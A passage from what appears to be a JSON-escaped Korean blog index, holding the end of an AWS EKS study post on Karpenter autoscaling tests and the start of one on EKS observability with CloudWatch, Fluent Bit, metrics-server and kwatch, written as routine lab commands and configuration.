\u0026#34;arn:aws:iam::${AWS_ACCOUNT_ID}:role/KarpenterNodeRole-${CLUSTER_NAME}\u0026#34; username: system:node:{{EC2PrivateDNSName}} groups: - system:bootstrappers - system:nodes managedNodeGroups: - instanceType: m5.large amiFamily: AmazonLinux2 name: ${CLUSTER_NAME}-ng desiredCapacity: 2 minSize: 1 maxSize: 10 iam: withAddonPolicies: externalDNS: true ## Optionally run on fargate # fargateProfiles: # - name: karpenter # selectors: # - namespace: karpenter EOF # EKS 배포 확인 eksctl get cluster eksctl get nodegroup --cluster $CLUSTER_NAME eksctl get iamidentitymapping --cluster $CLUSTER_NAME eksctl get iamserviceaccount --cluster $CLUSTER_NAME eksctl get addon --cluster $CLUSTER_NAME # 모니터링 준비: eks-node-viewer cd ~/go/bin \u0026amp;\u0026amp; ./eks-node-viewer # k8s 확인 # aws-auth에서 권한 매핑을 확인 kubectl cluster-info kubectl get node --label-columns=node.kubernetes.io/instance-type,eks.amazonaws.com/capacityType,topology.kubernetes.io/zone kubectl get pod -n kube-system -owide kubectl describe cm -n kube-system aws-auth # 카펜터 설치를 위한 환경 변수 설정 및 확인 export CLUSTER_ENDPOINT=\u0026#34;$(aws eks describe-cluster --name ${CLUSTER_NAME} --query \u0026#34;cluster.endpoint\u0026#34; --output text)\u0026#34; export KARPENTER_IAM_ROLE_ARN=\u0026#34;arn:aws:iam::${AWS_ACCOUNT_ID}:role/${CLUSTER_NAME}-karpenter\u0026#34; # EC2 Spot Fleet 사용을 위한 service-linked-role 생성 확인 # 제대로 생성된 것을 확인하는 거라 아래 에러 출력이 정상! # An error occurred (InvalidInput) when calling the CreateServiceLinkedRole operation: Service role name AWSServiceRoleForEC2Spot has been taken in this account, please try a different suffix. aws iam create-service-linked-role --aws-service-name spot.amazonaws.com || true # public ECR에서 인증되지 않은 pull 수행을 위해, 미리 로그아웃 # 실제 프로젝트에 적용할 때는, 로그아웃 안한 상태에서 시행해보고 어떤 현상이 일어나는지 볼 예정 (To-Do) docker logout public.ecr.aws # 원활한 설치를 위한 인자값 확인 echo $KARPENTER_VERSION $KARPENTER_IAM_ROLE_ARN $CLUSTER_NAME $CLUSTER_ENDPOINT # karpenter 설치 helm upgrade --install karpenter oci://public.ecr.aws/karpenter/karpenter --version ${KARPENTER_VERSION} --namespace karpenter --create-namespace \\ --set serviceAccount.annotations.\u0026#34;eks\\.amazonaws\\.com/role-arn\u0026#34;=${KARPENTER_IAM_ROLE_ARN} \\ --set settings.aws.clusterName=${CLUSTER_NAME} \\ --set settings.aws.defaultInstanceProfile=KarpenterNodeInstanceProfile-${CLUSTER_NAME} \\ --set settings.aws.interruptionQueueName=${CLUSTER_NAME} \\ --set controller.resources.requests.cpu=1 \\ --set controller.resources.requests.memory=1Gi \\ --set controller.resources.limits.cpu=1 \\ --set controller.resources.limits.memory=1Gi \\ --wait # 확인 kubectl get-all -n karpenter kubectl get all -n karpenter kubectl get cm -n karpenter karpenter-global-settings -o jsonpath={.data} | jq kubectl get crd | grep karpenter # 프로비저너 설치 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: karpenter.sh/v1alpha5 kind: Provisioner metadata: name: default spec: requirements: - key: karpenter.sh/capacity-type operator: In values: [\u0026#34;spot\u0026#34;] limits: resources: cpu: 1000 providerRef: name: default ttlSecondsAfterEmpty: 30 --- apiVersion: karpenter.k8s.aws/v1alpha1 kind: AWSNodeTemplate metadata: name: default spec: subnetSelector: karpenter.sh/discovery: ${CLUSTER_NAME} securityGroupSelector: karpenter.sh/discovery: ${CLUSTER_NAME} EOF # 확인 kubectl get awsnodetemplates,provisioners (옵션)ExternalDNS, kube-ops-view, grafana 실습 시, Grafana만 제대로 구동이 되지 않음 (To-Do) MyDomain=awskops.click echo \u0026#34;export MyDomain=awskops.click\u0026#34; \u0026gt;\u0026gt; /etc/profile MyDnzHostedZoneId=$(aws route53 list-hosted-zones-by-name --dns-name \u0026#34;${MyDomain}.\u0026#34; --query \u0026#34;HostedZones[0].Id\u0026#34; --output text) echo $MyDomain, $MyDnzHostedZoneId curl -s -O https://raw.githubusercontent.com/gasida/PKOS/main/aews/externaldns.yaml MyDomain=$MyDomain MyDnzHostedZoneId=$MyDnzHostedZoneId envsubst \u0026lt; externaldns.yaml | kubectl apply -f - # kube-ops-view helm repo add geek-cookbook https://geek-cookbook.github.io/charts/ helm install kube-ops-view geek-cookbook/kube-ops-view --version 1.2.2 --set env.TZ=\u0026#34;Asia/Seoul\u0026#34; --namespace kube-system kubectl patch svc -n kube-system kube-ops-view -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;LoadBalancer\u0026#34;}}\u0026#39; kubectl annotate service kube-ops-view -n kube-system \u0026#34;external-dns.alpha.kubernetes.io/hostname=kubeopsview.$MyDomain\u0026#34; echo -e \u0026#34;Kube Ops View URL = http://kubeopsview.$MyDomain:8080/#scale=1.5\u0026#34; helm repo add grafana-charts https://grafana.github.io/helm-charts helm repo add prometheus-community https://prometheus-community.github.io/helm-charts helm repo update kubectl create namespace monitoring # 프로메테우스 설치 curl -fsSL https://karpenter.sh/\u0026#34;${KARPENTER_VERSION}\u0026#34;/getting-started/getting-started-with-karpenter/prometheus-values.yaml | tee prometheus-values.yaml helm install --namespace monitoring prometheus prometheus-community/prometheus --values prometheus-values.yaml --set alertmanager.enabled=false # 그라파나 설치 curl -fsSL https://karpenter.sh/\u0026#34;${KARPENTER_VERSION}\u0026#34;/getting-started/getting-started-with-karpenter/grafana-values.yaml | tee grafana-values.yaml helm install --namespace monitoring grafana grafana-charts/grafana --values grafana-values.yaml --set service.type=LoadBalancer # admin 암호 kubectl get secret --namespace monitoring grafana -o jsonpath=\u0026#34;{.data.admin-password}\u0026#34; | base64 --decode ; echo # 그라파나 접속 kubectl annotate service grafana -n monitoring \u0026#34;external-dns.alpha.kubernetes.io/hostname=grafana.$MyDomain\u0026#34; echo -e \u0026#34;grafana URL = http://grafana.$MyDomain\u0026#34; 7-1. Karpenter 테스트 셋업 terminationGracePeriodSeconds: 0 정상 종료 동작이 수행되는 시간(Grace Period) 설정, 0으로 설정 시 바로 강제 종료 Docs에서는 강력하게 권장하지 않지만 실습의 빠른 진행을 위해 설정 (참조: k8s Docs) 초기 셋업의 레플리카셋 요청 수는 5개 # pause 파드 1개에 CPU 1개 최소 보장 할당 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: apps/v1 kind: Deployment metadata: name: inflate spec: replicas: 0 selector: matchLabels: app: inflate template: metadata: labels: app: inflate spec: terminationGracePeriodSeconds: 0 containers: - name: inflate image: public.ecr.aws/eks-distro/kubernetes/pause:3.7 resources: requests: cpu: 1 EOF kubectl scale deployment inflate --replicas 5 kubectl logs -f -n karpenter -l app.kubernetes.io/name=karpenter -c controller # 스팟 인스턴스 1개 생성이 확인 되어야 함. aws ec2 describe-spot-instance-requests --filters \u0026#34;Name=state,Values=active\u0026#34; --output table kubectl get node -l karpenter.sh/capacity-type=spot -o jsonpath=\u0026#39;{.items[0].metadata.labels}\u0026#39; | jq kubectl get node --label-columns=eks.amazonaws.com/capacityType,karpenter.sh/capacity-type,node.kubernetes.io/instance-type 7-2. Scale down 테스트 Deployment를 지우면, 30초 이후 \u0026lsquo;비어있는\u0026rsquo; 노드(스팟 인스턴스)를 삭제 ttlSecondsAfterEmpty: 30 지정하였기 때문 # Now, delete the deployment. After 30 seconds (ttlSecondsAfterEmpty), Karpenter should terminate the now empty nodes. kubectl delete deployment inflate kubectl logs -f -n karpenter -l app.kubernetes.io/name=karpenter -c controller 7-3. Consolidation 테스트 Consolidation이 생소한 단어라 따로 검색\n노드의 리소스 활용도를 높이고 비용을 절감하기 위해 작업 부하를 다른 노드로 이동시키는 기능 위에서 지정했던 ttlSecondsAfterEmpty과 동시 사용 불가 (참조: 아이엠 !나이롱맨 Blog) 실습에서는 12개의 레플리카셋을 생성하여 12Gi의 메모리 요청을 발생\n원래 예상한 것\nKarpenter가 m5.large 인스턴스 2개에 분산 배치 (m5.large: 8Gi) (8Gi - 약 600Mi) * 2 = 14.8Gi: kubelet에서 예약한 600Mi 제외 5개로 줄이면 인스턴스 하나를 삭제, 레플리카셋을 위한 m5.large 인스턴스 1개만 남음 다시 1개로 줄이면 인스턴스를 c5.large로 변경하여 최적화를 진행 실제\nCPU 하나당 Pod 하나, 즉 1:1 리소스 매칭 resources.requests.cpu: 1 Karpenter가 m5.xlarge 인스턴스 3개에 배치 (m5.xlarge.vCPU: 4) 4 * 3 = 12: 각 노드 당, Pod 4개 씩 배치 기존 spot 인스턴스는 제거됨 레플리카셋을 5개로 줄이면 필요없어진 2개의 m5.xlarge 노드만 삭제 log 확인 시, 한 번에 노드 2개 삭제가 아닌 1개 삭제 후 재확인다음, 추가 삭제 진행 레플리카셋을 위한 m5.large 인스턴스는 2개 남음 (예상과 동일) 다시 1개로 줄이면 c5.large로 변경하여 최적화 진행 (참고) condon: 통제, 차단 (출처: Cambrige Dictionary)\n# 기존의 프로비저너 삭제(ttySecondsAfterEmpty 충돌) 후 새 프로비저너 적용 kubectl delete provisioners default cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: karpenter.sh/v1alpha5 kind: Provisioner metadata: name: default spec: consolidation: enabled: true labels: type: karpenter limits: resources: cpu: 1000 memory: 1000Gi providerRef: name: default requirements: - key: karpenter.sh/capacity-type operator: In values: - on-demand - key: node.kubernetes.io/instance-type operator: In values: - c5.large - m5.large - m5.xlarge EOF # 앞에서 했던 테스트와 동일한 deployment 적용 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: apps/v1 kind: Deployment metadata: name: inflate spec: replicas: 0 selector: matchLabels: app: inflate template: metadata: labels: app: inflate spec: terminationGracePeriodSeconds: 0 containers: - name: inflate image: public.ecr.aws/eks-distro/kubernetes/pause:3.7 resources: requests: cpu: 1 EOF # 레플리카셋 12개 생성 kubectl scale deployment inflate --replicas 12 kubectl logs -f -n karpenter -l app.kubernetes.io/name=karpenter -c controller # 인스턴스 확인 # m5.xlarge 노드 4개 생성 확인 kubectl get node -l type=karpenter kubectl get node --label-columns=eks.amazonaws.com/capacityType,karpenter.sh/capacity-type kubectl get node --label-columns=node.kubernetes.io/instance-type,topology.kubernetes.io/zone # 레플리카셋 5개로 축소 kubectl scale deployment inflate --replicas 5 # 로그를 통해 확인하면, 필요없는 노드를 차단(통제)하고 drain을 수행을 확인 # INFO controller.deprovisioning deprovisioning via consolidation delete, terminating 1 machines ... # INFO controller.termination cordoned node ... # INFO controller.termination deleted node ... # DEBUG controller deleted launch template ... kubectl logs -f -n karpenter -l app.kubernetes.io/name=karpenter -c controller # 레플리카셋 1개로 축소 후 로그 확인 # INFO controller.consolidation Launching node with 1 pods requesting ... from types c5.large kubectl scale deployment inflate --replicas 1 kubectl logs -f -n karpenter -l app.kubernetes.io/name=karpenter -c controller # 인스턴스 확인 후 삭제 kubectl get node -l type=karpenter kubectl get node --label-columns=eks.amazonaws.com/capacityType,karpenter.sh/capacity-type kubectl get node --label-columns=node.kubernetes.io/instance-type,topology.kubernetes.io/zone kubectl delete deployment inflate ","date":"2023-05-22T19:23:37+09:00","permalink":"https://blog.minseong.xyz/post/aws-eks-study-week5/","section":"post","tags":["AWS","EKS","CloudNet@","autoscaling","karpenter"],"title":"AWS EKS 스터디 5주차 - Autoscaling"},{"categories":null,"contents":"이번 주차에는 Observability에 대해 스터디가 진행되었습니다.\n자원 모니터링 툴들의 적용 및 사용이 중심입니다.\n그나저나 k8s 1.26에서 metrics의 일부 명칭이 바뀌는 걸 보고 식겁했습니다.\n(etcd_db_total_size_bytes 대신, apiserver_storage_db_total_size_in_bytes 으로 변경)\n또한 kubecost의 경우, cloudformation 스택 제거 후에도 볼륨 데이터가 남아있어서 별도로 삭제해야 했습니다.\n1. 실습환경 배포 NAT게이트웨이, EBS addon, IAM role, ISRA for LB/EFS, PreCommand 포함 노드: t3.xlarge t3a.xlarge(AMD)는 서울 리전 b AZ(ap-northeast-2b)에서 미지원 더 많은 값들이 입력되어서, 생성 완료까지 더 많은 시간이 소요 (약 20여분 이내) curl -O https://s3.ap-northeast-2.amazonaws.com/cloudformation.cloudneta.net/K8S/eks-oneclick3.yaml # 이하 생략, 3주차 참고 2. EKS Console 쿠버네티스 API를 통해서 리소스 및 정보 확인 kubectl get ClusterRole | grep eks EKS Cluster에 대한 IAM Role 정보 확인: 연결 정책\n웹 콘솔에서 다음과 같은 정보 확인 가능 (출처: EKS Workshop)\nWorkloads, Cluster, Service\u0026amp;Networking, Config\u0026amp;Secret, Storage, Authentication, Authoriztion, Policy, Extensions 3. Logging in EKS 로깅 대상 구분 Control Plane Node Application 3-1. Control Plane Logging 출처: EKS Docs 로그 그룹 이름: /aws/eks/\u0026lt;cluster-name\u0026gt;/cluster 로깅은 5가지가 지원 api : k8s API server component logs audit authenticator controllerManager scheduler 로깅을 활성화 한 후에 확인 아래에서는 kube-controller-manager를 대상으로 coredns 레플리카 수를 조정하면서 로그를 확인 # 모든 로깅 활성화 aws eks update-cluster-config --region $AWS_DEFAULT_REGION --name $CLUSTER_NAME \\ --logging \u0026#39;{\u0026#34;clusterLogging\u0026#34;:[{\u0026#34;types\u0026#34;:[\u0026#34;api\u0026#34;,\u0026#34;audit\u0026#34;,\u0026#34;authenticator\u0026#34;,\u0026#34;controllerManager\u0026#34;,\u0026#34;scheduler\u0026#34;],\u0026#34;enabled\u0026#34;:true}]}\u0026#39; # 로그 그룹 확인 aws logs describe-log-groups | jq # 로그 tail 확인 aws logs tail /aws/eks/$CLUSTER_NAME/cluster | more # 시간 지정: 1초(s) 1분(m) 1시간(h) 하루(d) 한주(w) / 짧게 출력 aws logs tail /aws/eks/$CLUSTER_NAME/cluster --since 1h30m --format short # 로그 스트림 kubectl scale deployment -n kube-system coredns --replicas=1 kubectl scale deployment -n kube-system coredns --replicas=2 3-2. CloudWatch(이하, CW) Log Insights 웹 콘솔에서 로그 그룹을 대상으로 쿼리를 수행 # EC2 Instance가 NodeNotReady 상태인 로그 검색, 정상적인 경우 뜨지 않음 fields @timestamp, @message | filter @message like /NodeNotReady/ | sort @timestamp desc # kube-apiserver-audit 로그에서 userAgent 정렬하여 확인 # 앞서 활성화한 다른 로그(kube-scheduler, authenticator, kube-controller-Manager)도 확인 가능 fields userAgent, requestURI, @timestamp, @message | filter @logStream ~= \u0026#34;kube-apiserver-audit\u0026#34; | stats count(userAgent) as count by userAgent | sort count desc 3-3. CW Log Insights Query with aws-cli 아래와 같이 cli로도 쿼리 가능 # CloudWatch Log Insight Query aws logs get-query-results --query-id $(aws logs start-query \\ --log-group-name \u0026#39;/aws/eks/myeks/cluster\u0026#39; \\ --start-time `date -d \u0026#34;-1 hours\u0026#34; +%s` \\ --end-time `date +%s` \\ --query-string \u0026#39;fields @timestamp, @message | filter @logStream ~= \u0026#34;kube-scheduler\u0026#34; | sort @timestamp desc\u0026#39; \\ | jq --raw-output \u0026#39;.queryId\u0026#39;) 3-4. Control Plane raw metrics with CW Logs Insight 출처: EKS Docs 아래의 쿼리는 Prometheus 포맷으로 raw metrics 출력 metric_name{\u0026quot;tag\u0026quot;=\u0026quot;value\u0026quot;[,...]} value kubectl get --raw /metrics | more 3-5. Managing etcd database size on EKS clusters 출처: AWS Blog 아래와 같이 입력하면 etcd의 데이터베이스 사이즈를 확인 가능 이때 옆에 뜨는 엔드포인트는 etcd 서버의 엔드포인트. (참조: Github) 참고로, EKS에서는 etcd가 AWS-managed k8s v1.26 부터는 etcd_db_total_size_bytes 대신,\napiserver_storage_db_total_size_in_bytes 으로 변경 (참조: sysdig) kubectl get --raw /metrics | grep \u0026#34;etcd_db_total_size_in_bytes\u0026#34; # etcd_db_total_size_in_bytes{endpoint=\u0026#34;http://10.0.160.16:2379\u0026#34;} 4.665344e+06 # etcd_db_total_size_in_bytes{endpoint=\u0026#34;http://10.0.32.16:2379\u0026#34;} 4.636672e+06 # etcd_db_total_size_in_bytes{endpoint=\u0026#34;http://10.0.96.16:2379\u0026#34;} 4.640768e+06 CW Logs Insights Query for exceeded etcd database space fields @timestamp, @message, @logStream | filter @logStream like /kube-apiserver-audit/ | filter @message like /mvcc: database space exceeded/ | limit 10 Identify what is consuming etcd database space kubectl get --raw=/metrics | grep apiserver_storage_objects |awk \u0026#39;$2\u0026gt;50\u0026#39; |sort -g -k 2 # apiserver_storage_objects{resource=\u0026#34;clusterrolebindings.rbac.authorization.k8s.io\u0026#34;} 78 # apiserver_storage_objects{resource=\u0026#34;clusterroles.rbac.authorization.k8s.io\u0026#34;} 92 CW Logs Insights Query for Request volume # By userAgents fields userAgent, requestURI, @timestamp, @message | filter @logStream like /kube-apiserver-audit/ | stats count(*) as count by userAgent | sort count desc # By Requests by Universal Resource Identifier (URI)/Verb: filter @logStream like /kube-apiserver-audit/ | stats count(*) as count by requestURI, verb, user.username | sort count desc # Object revision updates fields requestURI | filter @logStream like /kube-apiserver-audit/ | filter requestURI like /pods/ | filter verb like /patch/ | filter count \u0026gt; 8 | stats count(*) as count by requestURI, responseStatus.code | filter responseStatus.code not like /500/ | sort count desc 정확한 내용은 도입부의 AWS Blog 참고 3-6. 컨테이너(Pod) 로깅 with Nginx 아래와 같이 nginx를 배포하고, 반복 접속. 이어질 Prometheus와 Grafana 실습에서도 metric 자료로 활용 # NGINX 웹서버 배포 helm repo add bitnami https://charts.bitnami.com/bitnami # 사용 리전의 인증서 ARN 확인 CERT_ARN=$(aws acm list-certificates --query \u0026#39;CertificateSummaryList[].CertificateArn[]\u0026#39; --output text) echo $CERT_ARN # 도메인 확인 echo $MyDomain # 파라미터 파일 생성 cat \u0026lt;\u0026lt;EOT \u0026gt; nginx-values.yaml service: type: NodePort ingress: enabled: true ingressClassName: alb hostname: nginx.$MyDomain path: /* annotations: alb.ingress.kubernetes.io/scheme: internet-facing alb.ingress.kubernetes.io/target-type: ip alb.ingress.kubernetes.io/listen-ports: \u0026#39;[{\u0026#34;HTTPS\u0026#34;:443}, {\u0026#34;HTTP\u0026#34;:80}]\u0026#39; alb.ingress.kubernetes.io/certificate-arn: $CERT_ARN alb.ingress.kubernetes.io/success-codes: 200-399 alb.ingress.kubernetes.io/load-balancer-name: $CLUSTER_NAME-ingress-alb alb.ingress.kubernetes.io/group.name: study alb.ingress.kubernetes.io/ssl-redirect: \u0026#39;443\u0026#39; EOT cat nginx-values.yaml | yh # 배포 helm install nginx bitnami/nginx --version 14.1.0 -f nginx-values.yaml # 확인 kubectl get ingress,deploy,svc,ep nginx kubectl get targetgroupbindings # 접속 주소 확인 및 접속 echo -e \u0026#34;Nginx WebServer URL = https://nginx.$MyDomain\u0026#34; curl -s https://nginx.$MyDomain kubectl logs deploy/nginx -f # 반복 접속 while true; do curl -s https://nginx.$MyDomain -I | head -n 1; date; sleep 1; done # (참고) 삭제 시 helm uninstall nginx 로그 모니터링 및 컨테이너 로그 파일 위치 확인 컨테이너의 로그는 표준 출력(stdout)과 표준 에러(stderr)로 나뉘어서 보내는 것이 권고사항 (참조: k8s Docs) # 로그 모니터링 kubectl logs deploy/nginx -f # nginx 웹 접속 시도 시 위의 모니터링에 실시간으로 확인 가능 # 컨테이너 로그 파일 위치 확인 kubectl exec -it deploy/nginx -- ls -l /opt/bitnami/nginx/logs/ # total 0 # lrwxrwxrwx 1 root root 11 Feb 18 13:35 access.log -\u0026gt; /dev/stdout # lrwxrwxrwx 1 root root 11 Feb 18 13:35 error.log -\u0026gt; /dev/stderr 4. Fluent Bit integration in CCI(CW Container Insights) for EKS 출처: AWS Docs 노드에 CW Agent(Pod)는 Metrics 수집, Fluent Bit Pod는 Logs 수집을 위하여 데몬 셋으로 동작 Fluent Bit은 Fluentd의 경량화 버전. config 설정에 차이가 있음 (참조: AWS Docs) 4-1. application 및 host 로그 소스 확인 application 로그 소스: 각 컨테이너/파드 로그 /var/log/containers → 심볼릭 링크 /var/log/pods/\u0026lt;컨테이너\u0026gt; host 로그 소스: 노드(호스트) 로그 /var/log/dmesg, /var/log/secure, /var/log/messages dataplane 로그 소스: 쿠버네티스 데이터플레인 로그 /var/log/journal for kubelet.service/kubeproxy.service/docker.service # application 로그 위치 확인 for node in $N1 $N2 $N3; do echo \u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; $node \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026#34;; ssh ec2-user@$node sudo tree /var/log/containers; echo; done for node in $N1 $N2 $N3; do echo \u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; $node \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026#34;; ssh ec2-user@$node sudo ls -al /var/log/containers; echo; done # 개별 파드 로그 확인 ssh ec2-user@$N1 sudo tail -f /var/log/pods/default_nginx-\u0026lt;파드 고유 이름\u0026gt;/nginx/0.log # host 로그 위치 확인 for node in $N1 $N2 $N3; do echo \u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; $node \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026#34;; ssh ec2-user@$node sudo tree /var/log/ -L 1; echo; done for node in $N1 $N2 $N3; do echo \u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; $node \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026#34;; ssh ec2-user@$node sudo ls -la /var/log/; echo; done # host 로그 확인 for log in dmesg secure messages; do echo \u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; Node1: /var/log/$log \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026#34;; ssh ec2-user@$N1 sudo tail /var/log/$log; echo; done for log in dmesg secure messages; do echo \u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; Node2: /var/log/$log \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026#34;; ssh ec2-user@$N2 sudo tail /var/log/$log; echo; done for log in dmesg secure messages; do echo \u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; Node3: /var/log/$log \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026#34;; ssh ec2-user@$N3 sudo tail /var/log/$log; echo; done # dataplane 로그 위치 확인 for node in $N1 $N2 $N3; do echo \u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; $node \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026#34;; ssh ec2-user@$node sudo tree /var/log/journal -L 1; echo; done # 저널 로그 확인 - 링크 ssh ec2-user@$N3 sudo journalctl -x -n 200 ssh ec2-user@$N3 sudo journalctl -f 4-2. CCI(CW-agent 및 fluent-bit) 설치 및 Fluent Bit 설정 출처: AWS Docs CW-agent나 fluent-bit이나 HostPath에 수집된 정보를 저장하고 있음을 확인 # 설치 FluentBitHttpServer=\u0026#39;On\u0026#39; FluentBitHttpPort=\u0026#39;2020\u0026#39; FluentBitReadFromHead=\u0026#39;Off\u0026#39; FluentBitReadFromTail=\u0026#39;On\u0026#39; curl -s https://raw.githubusercontent.com/aws-samples/amazon-cloudwatch-container-insights/latest/k8s-deployment-manifest-templates/deployment-mode/daemonset/container-insights-monitoring/quickstart/cwagent-fluent-bit-quickstart.yaml | sed \u0026#39;s/{{cluster_name}}/\u0026#39;${CLUSTER_NAME}\u0026#39;/;s/{{region_name}}/\u0026#39;${AWS_DEFAULT_REGION}\u0026#39;/;s/{{http_server_toggle}}/\u0026#34;\u0026#39;${FluentBitHttpServer}\u0026#39;\u0026#34;/;s/{{http_server_port}}/\u0026#34;\u0026#39;${FluentBitHttpPort}\u0026#39;\u0026#34;/;s/{{read_from_head}}/\u0026#34;\u0026#39;${FluentBitReadFromHead}\u0026#39;\u0026#34;/;s/{{read_from_tail}}/\u0026#34;\u0026#39;${FluentBitReadFromTail}\u0026#39;\u0026#34;/\u0026#39; | kubectl apply -f - # 설치 확인 kubectl get-all -n amazon-cloudwatch kubectl get ds,pod,cm,sa -n amazon-cloudwatch kubectl describe clusterrole cloudwatch-agent-role fluent-bit-role # 클러스터롤 확인 kubectl describe clusterrolebindings cloudwatch-agent-role-binding fluent-bit-role-binding # 클러스터롤 바인딩 확인 kubectl -n amazon-cloudwatch logs -l name=cloudwatch-agent -f # 파드 로그 확인 kubectl -n amazon-cloudwatch logs -l k8s-app=fluent-bit -f # 파드 로그 확인 for node in $N1 $N2 $N3; do echo \u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; $node \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026#34;; ssh ec2-user@$node sudo ss -tnlp | grep fluent-bit; echo; done # cloudwatch-agent 설정 확인 kubectl describe cm cwagentconfig -n amazon-cloudwatch { \u0026#34;agent\u0026#34;: { \u0026#34;region\u0026#34;: \u0026#34;ap-northeast-2\u0026#34; }, \u0026#34;logs\u0026#34;: { \u0026#34;metrics_collected\u0026#34;: { \u0026#34;kubernetes\u0026#34;: { \u0026#34;cluster_name\u0026#34;: \u0026#34;myeks\u0026#34;, \u0026#34;metrics_collection_interval\u0026#34;: 60 } }, \u0026#34;force_flush_interval\u0026#34;: 5 } } # CW 파드가 수집하는 방법 : Volumes -\u0026gt; HostPath # ssh ec2-user@$N1 sudo tree /dev/disk kubectl describe -n amazon-cloudwatch ds cloudwatch-agent # Fluent Bit Cluster Info 확인 kubectl get cm -n amazon-cloudwatch fluent-bit-cluster-info -o yaml | yh apiVersion: v1 data: cluster.name: myeks http.port: \u0026#34;2020\u0026#34; http.server: \u0026#34;On\u0026#34; logs.region: ap-northeast-2 read.head: \u0026#34;Off\u0026#34; read.tail: \u0026#34;On\u0026#34; kind: ConfigMap ... # Fluent Bit 로그 INPUT/FILTER/OUTPUT 설정 확인 - 링크 ## 설정 부분 구성 : application-log.conf , dataplane-log.conf , fluent-bit.conf , host-log.conf , parsers.conf kubectl describe cm fluent-bit-config -n amazon-cloudwatch ... application-log.conf: ---- [INPUT] Name tail Tag application.* Exclude_Path /var/log/containers/cloudwatch-agent*, /var/log/containers/fluent-bit*, /var/log/containers/aws-node*, /var/log/containers/kube-proxy* Path /var/log/containers/*.log multiline.parser docker, cri DB /var/fluent-bit/state/flb_container.db Mem_Buf_Limit 50MB Skip_Long_Lines On Refresh_Interval 10 Rotate_Wait 30 storage.type filesystem Read_from_Head ${READ_FROM_HEAD} [FILTER] Name kubernetes Match application.* Kube_URL https://kubernetes.default.svc:443 Kube_Tag_Prefix application.var.log.containers. Merge_Log On Merge_Log_Key log_processed K8S-Logging.Parser On K8S-Logging.Exclude Off Labels Off Annotations Off Use_Kubelet On Kubelet_Port 10250 Buffer_Size 0 [OUTPUT] Name cloudwatch_logs Match application.* region ${AWS_REGION} log_group_name /aws/containerinsights/${CLUSTER_NAME}/application log_stream_prefix ${HOST_NAME}- auto_create_group true extra_user_agent container-insights ... # Fluent Bit 파드가 수집하는 방법 : Volumes -\u0026gt; HostPath # ssh ec2-user@$N1 sudo tree /var/log kubectl describe -n amazon-cloudwatch ds fluent-bit 웹 콘솔에서도 Logs/Metrics 확인 가능 Logs : CW -\u0026gt; Logs -\u0026gt; Log groups -\u0026gt; /aws/containerinsights/myeks/application NGINX 웹서버 부하 발생을 통한 로그 확인: Logs를 대상으로 nginx 검색 # 부하 발생 curl -s https://nginx.$MyDomain yum install -y httpd ab -c 500 -n 30000 https://nginx.$MyDomain/ # 파드 직접 로그 모니터링 kubectl logs deploy/nginx -f Metrics : CloudWatch -\u0026gt; Insights -\u0026gt; ContainerInsights -\u0026gt; myeks Container map을 통한 시각화가 가능한데, 간격이 너무 벌어져서 있어 한번에 보기 불편 이외에도, 리소스 및 성능 모니터링을 지원 5. Metric-server / kwatch / botkube (addon tools) Metric-server: kubelet으로부터 수집한 리소스 metrics를 수집-집계하는 cluster addon kwatch: k8s 클러스터의 변화를 모니터링하여, Slack/Discord 등으로 알림을 보내주는 도구 Slack 등에서 사용을 위해 Webhook 토큰 필요 botkube: Slack/Discord 환경에서 Bot을 통해, 간단하게 k8s 명령어를 사용할 수 있는 도구 실습에서는 Slack API Bot/App 토큰 사용 ################ ## Metric-server ################ # 배포 kubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml # 메트릭 서버 확인 : 메트릭은 15초 간격으로 cAdvisor를 통하여 가져옴 kubectl get pod -n kube-system -l k8s-app=metrics-server kubectl api-resources | grep metrics kubectl get apiservices |egrep \u0026#39;(AVAILABLE|metrics)\u0026#39; # 노드 메트릭 확인 kubectl top node # 파드 메트릭 확인 kubectl top pod -A kubectl top pod -n kube-system --sort-by=\u0026#39;cpu\u0026#39; kubectl top pod -n kube-system --sort-by=\u0026#39;memory\u0026#39; ######### ## kwatch ######### # configmap 생성 cat \u0026lt;\u0026lt;EOT \u0026gt; ~/kwatch-config.yaml apiVersion: v1 kind: Namespace metadata: name: kwatch --- apiVersion: v1 kind: ConfigMap metadata: name: kwatch namespace: kwatch data: config.yaml: | alert: slack: webhook: \u0026#39;https://hooks.slack.com/services/\u0026lt;Webhook 토큰\u0026gt;\u0026#39; title: $NICK-EKS #text: pvcMonitor: enabled: true interval: 5 threshold: 70 EOT kubectl apply -f kwatch-config.yaml # 배포 kubectl apply -f https://raw.githubusercontent.com/abahmed/kwatch/v0.8.3/deploy/deploy.yaml ## (장애 재현)잘못된 이미지를 배포하여, kwatch가 알림을 보내는지 확인 # 모니터링 준비 watch kubectl get pod # 잘못된 이미지 정보의 파드 배포 kubectl apply -f https://raw.githubusercontent.com/junghoon2/kube-books/main/ch05/nginx-error-pod.yml kubectl get events -w # 이미지 업데이트 방안 : set 사용 - image 